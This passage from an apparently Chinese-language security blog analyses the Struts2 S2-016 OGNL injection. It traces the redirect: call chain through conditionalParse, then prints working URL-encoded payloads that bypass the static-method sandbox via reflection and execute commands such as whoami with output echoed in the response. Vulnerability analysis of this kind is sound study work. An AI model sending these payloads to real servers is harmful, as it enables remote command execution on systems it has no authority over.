String var = expression.substring(start + 2, end);  // 提取表达式，跳过前面的 ${
// 所以 var = "1+1"
// 然后丢给 evaluator.evaluate("1+1") 执行
```

调用了 `ognlEval` 这个回调，最后来到：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_2yd5.png)

这里的代码就和前面的示例代码类似了：

```
参数：
expr    = "1+1"        ← 用户输入的表达式
context = OGNL context ← 里面有 request/response/session
root    = Action 对象  ← HelloAction 实例
asType  = String.class ← 期望返回类型
```

`ognlUtil.getValue()` 里面就是调用 OGNL 库的：

```java
Ognl.getValue(expr, context, root)
```

处理完后把结果处理成字符串返回：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510110717618.png)

然后经过一系列返回，回到父类的 `execute` 方法：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_90gz.png)

接下来是 `doExecute` 的方法，其中第一个参数 `lastFinalLocation` 就是表达式的返回值 `2`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_py44.png)

方法的最后面就是：

```java
sendRedirect(response, finalLocation);
```

也就是页面的重定向了，这也是为什么表达式注入的时候 URL 变成了 `/2`。

---

### 漏洞根因总结

完整调用链：

```
用户输入 redirect:${1+1}
        ↓
DefaultActionMapper.evaluate()
截取 location = "${1+1}"
        ↓
ServletRedirectResult.execute()
        ↓
StrutsResultSupport.conditionalParse()
        ↓
TextParseUtil.translateVariables()
        ↓
OgnlTextParser.evaluate()
substring 提取 "1+1"
        ↓
evaluator.evaluate("1+1")
        ↓
stack.findValue("1+1")
        ↓
OgnlUtil.getValue()
        ↓
Ognl.getValue("1+1", context, root)
        ↓
返回 2
```

- `conditionalParse()` → 执行 OGNL，得到结果 `"2"`
- `doExecute()` → 拿结果去 redirect，和 OGNL 没关系了

**漏洞触发在 `conditionalParse()`，`doExecute()` 只是善后，执不执行都无所谓，RCE 已经发生了。**

```
用户输入 → substring 截取 → setLocation → conditionalParse → OGNL 执行
全程没有任何过滤和验证
```

只要写法是 `?redirect:${OGNL 表达式}` 就能触发，根据看到的代码，能触发的注入点远远不止 `redirect:` 这一种。

---

## 九、Payload 调试与完整利用

### 简单 RCE Payload（无回显）

因为没有任何过滤，随便写能用的 OGNL 代码即可，先试最简单的：

```
/index.action?redirect:%24%7B%40java.lang.Runtime%40getRuntime().exec(%22calc%22)%7D
```

也就是：

```
redirect:${@java.lang.Runtime@getRuntime().exec("calc")}
```

### 问题：静态方法被拦截

发包之后发现计算器没有正常弹出，而是重定向到了 `/`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_6b7k.png)

调试发现 `expr` 就是 `@java.lang.Runtime@getRuntime().exec("calc.exe")`，数据正常传入了：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_rrb1.png)

但经过 OGNL 返回的 `o` 确实是 `null`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_gl75.png)

这说明数据正常输入了，没有被过滤，但经过 OGNL 处理时却失败了。跟进 `ognlEval` 里看看怎么回事：

```
findValue
>> tryFindValueWhenExpressionIsNotNull
>> tryFindValue
>> getValue
>> ...
```

最后到了 `SecurityMemberAccess.isAccessible()`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_qdoa.png)

```java
if (Modifier.isStatic(modifiers)) {
    if (member instanceof Method && !getAllowStaticMethodAccess()) {
        allow = false;
        // ...
    }
}
```

这就是拦截静态方法的地方：

```
检测到是静态方法调用
        ↓
getAllowStaticMethodAccess() 返回 false
        ↓
allow = false
        ↓
if (!allow) return false
        ↓
isAccessible 返回 false
        ↓
OGNL 拒绝执行
        ↓
返回 null
```

所以完整 Payload 里那两步绕过是必须的。

---

### Payload 2：绕过静态方法限制

Payload 绕过方式就是用反射把 `allowStaticMethodAccess` 改成 `true`：

```java
#f = #_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess")
#f.setAccessible(true)
#f.set(#_memberAccess, true)
        ↓
getAllowStaticMethodAccess() 返回 true
        ↓
allow = true
        ↓
isAccessible 返回 true
        ↓
静态方法调用成功
```

完整 Payload（格式化版）：

```
redirect:${
  #f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),
  #f.setAccessible(true),
  #f.set(#_memberAccess,true),
  @java.lang.Runtime@getRuntime().exec("calc.exe")
}
```

URL 编码版本：

```
/index.action?redirect:%24%7B%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%40java.lang.Runtime%40getRuntime().exec(%22calc.exe%22)%7D
```

发包之后成功弹出了计算器：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_znm8.png)

---

### Payload 3：命令回显版

弹计算器只是验证，实际利用需要命令回显，完整 Payload：

```
redirect:${
  // 用反射把沙箱的 allowStaticMethodAccess 改成 true，允许静态方法调用
  #f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),
  #f.setAccessible(true),
  #f.set(#_memberAccess,true),

  // 调用 Runtime 静态方法拿到实例，执行 whoami 命令，返回 Process 对象存进 #a
  #a=@java.lang.Runtime@getRuntime().exec("whoami"),

  // 读取命令执行结果：Java 里标准的读取进程输出写法
  #b=new java.io.InputStreamReader(#a.getInputStream()),
  #c=new java.io.BufferedReader(#b),
  #d=#c.readLine(),

  // 从 OGNL context 里取出 HttpServletResponse 对象存进 #matt
  // 用全限定名取是因为 Struts2 就是用这个 key 存进去的
  #matt=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),

  // 把命令执行结果写进 HTTP Response，在 Burp 的 Response body 里就能看到结果
  #matt.getWriter().println(#d),
  #matt.getWriter().flush(),
  #matt.getWriter().close()
}
```

URL 编码版本：

```
/index.action?redirect:%24%7B%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22whoami%22)%2C%23b%3Dnew+java.io.InputStreamReader(%23a.getInputStream())%2C%23c%3Dnew+java.io.BufferedReader(%23b)%2C%23d%3D%23c.readLine()%2C%23matt%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23matt.getWriter().println(%23d)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D
```

命令回显成功：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_5ww2.png)

---

## 十、总结

S2-016 本身不复杂，但背后的东西值得花时间搞清楚。

**漏洞核心：** 用户输入的 `redirect:` 后面的内容，在 `DefaultActionMapper` 里被 `substring` 截取后没有任何过滤，直接通过 `setLocation` 存入 `ServletRedirectResult`，最终在 `StrutsResultSupport.conditionalParse()` 里被丢给 OGNL 引擎执行，实现 RCE。

**OGNL 注入的本质：** 就是表达式注入的一种，和 SSTI 同类，区别只在于解析引擎不同。OGNL 直接对应 Java 代码，`Runtime.exec()` 调用路径极短，加上 Java 反射机制强大，沙箱绕过相对容易，比模板引擎的 SSTI 更危险。

**Struts2 为什么漏洞这么多：** 框架过度依赖 OGNL，URL 参数名、参数值前缀、请求头、请求体、文件名、命名空间处处都在做 OGNL 求值，只要有一个地方没过滤用户输入，就是漏洞。
